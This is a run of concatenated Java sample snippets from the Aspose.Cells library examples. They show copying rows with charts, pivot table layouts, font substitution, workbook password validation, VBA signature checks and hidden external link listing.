// Save the workbook in xlsx format
wb.save(dataDir + ""CCSpacing_out.xlsx"", SaveFormat.XLSX);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
String dataDir = Utils.getDataDir(ChangeDataSource.class);
// Load sample excel file
Workbook wb = new Workbook(dataDir + ""sample.xlsx"");


// Access the first sheet which contains chart
Worksheet source = wb.getWorksheets().get(0);


// Add another sheet named DestSheet
Worksheet destination = wb.getWorksheets().add(""DestSheet"");


// Set CopyOptions.ReferToDestinationSheet to true
CopyOptions options = new CopyOptions();
options.setReferToDestinationSheet(true);


/*
 * Copy all the rows of source worksheet to destination worksheet which includes chart as well The chart data source will
 * now refer to DestSheet
 */
destination.getCells().copyRows(source.getCells(), 0, 0, source.getCells().getMaxDisplayRange().getRowCount(),
 options);


// Save workbook in xlsx format
wb.save(dataDir + ""output.xlsx"", SaveFormat.XLSX);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(ChangeFontonspecificUnicodecharacters.class);


// Create workbook object
Workbook workbook = new Workbook();


// Access the first worksheet
Worksheet worksheet = workbook.getWorksheets().get(0);


// Access cells
Cell cell1 = worksheet.getCells().get(""A1"");
Cell cell2 = worksheet.getCells().get(""B1"");


// Set the styles of both cells to Times New Roman
Style style = cell1.getStyle();
style.getFont().setName(""Times New Roman"");
cell1.setStyle(style);
cell2.setStyle(style);


// Put the values inside the cell
cell1.putValue(""Hello without Non-Breaking Hyphen"");
cell2.putValue(""Hello"" + (char) (8209) + "" with Non-Breaking Hyphen"");


// Autofit the columns
worksheet.autoFitColumns();


// Save to Pdf without setting PdfSaveOptions.IsFontSubstitutionCharGranularity
workbook.save(dataDir + ""output.pdf"");


// Save to Pdf after setting PdfSaveOptions.IsFontSubstitutionCharGranularity to true
PdfSaveOptions opts = new PdfSaveOptions();
opts.setFontSubstitutionCharGranularity(true);
workbook.save(dataDir + ""output2.pdf"", opts);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(ChangeHTMLLinkTargetType.class);
Workbook workbook = new Workbook(dataDir + ""source.xlsx"");


HtmlSaveOptions opts = new HtmlSaveOptions();
opts.setLinkTargetType(HtmlLinkTargetType.SELF);


workbook.save(dataDir + ""out.html"", opts);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(ChangingLayoutofPivotTable.class);
// Create workbook object from source excel file
Workbook workbook = new Workbook(dataDir + ""source.xlsx"");


// Access first worksheet
Worksheet worksheet = workbook.getWorksheets().get(0);


// Access first pivot table
PivotTable pivotTable = worksheet.getPivotTables().get(0);


// 1 - Show the pivot table in compact form
pivotTable.showInCompactForm();


// Refresh the pivot table
pivotTable.refreshData();
pivotTable.calculateData();


// Save the output
workbook.save(""CompactForm.xlsx"");


// 2 - Show the pivot table in outline form
pivotTable.showInOutlineForm();


// Refresh the pivot table
pivotTable.refreshData();
pivotTable.calculateData();


// Save the output
workbook.save(""OutlineForm.xlsx"");


// 3 - Show the pivot table in tabular form
pivotTable.showInTabularForm();


// Refresh the pivot table
pivotTable.refreshData();
pivotTable.calculateData();


// Save the output
workbook.save(dataDir + ""TabularForm.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(CheckPassword.class) + ""articles/"";


// Specify password to open inside the load options
LoadOptions opts = new LoadOptions();
opts.setPassword(""1234"");


// Open the source Excel file with load options
Workbook workbook = new Workbook(dataDir + ""Book1.xlsx"", opts);


// Check if 567 is Password to modify
boolean ret = workbook.getSettings().getWriteProtection().validatePassword(""567"");
System.out.println(""Is 567 correct Password to modify: "" + ret);


// Check if 5678 is Password to modify
ret = workbook.getSettings().getWriteProtection().validatePassword(""5678"");
System.out.println(""Is 5678 correct Password to modify: "" + ret);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(CheckVBAProjectInWorkbookIsSigned.class);
Workbook workbook = new Workbook(dataDir + ""source.xlsm"");
System.out.println(""VBA Project is Signed: "" + workbook.getVbaProject().isSigned());
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
String dataDir = Utils.getDataDir(CheckVbaProjectSigned.class);
String inputPath = dataDir + ""Sample1.xlsx"";


Workbook workbook = new Workbook(inputPath);


System.out.println(""VBA Project is Signed: "" + workbook.getVbaProject().isSigned());
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(CheckWorkbookContainsHiddenExternalLinks.class) + ""articles/"";


// Loads the workbook which contains hidden external links
Workbook workbook = new Workbook(dataDir + ""CheckWorkbookContainsHiddenExternalLinks_in.xlsx"");


// Access the external link collection of the workbook
ExternalLinkCollection links = workbook.getWorksheets().getExternalLinks();


// Print all the external links and check there IsVisible property
for (int i = 0; i < links.getCount(); i++) {
System.out.println(""Data Source: "" + links.get(i).getDataSource());
System.out.println(""Is Referred: "" + links.get(i).isReferred());
System.out.println(""Is Visible: "" + links.get(i).isVisible());
System.out.println();
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
String dataDir = Utils.getDataDir(ColumnsIterator.class);
// Load a file in an instance of Workbook
Workbook book = new Workbook(dataDir + ""sample.xlsx"");


// Get the iterator for ColumnsCollection
Iterator colsIterator = book.getWorksheets().get(0).getCells().getColumns().iterator();
// Traverse columns in the collection
while (colsIterator.hasNext()) {
 Column col = (Column) colsIterator.next();
 System.out.println(col.getIndex());
}
"
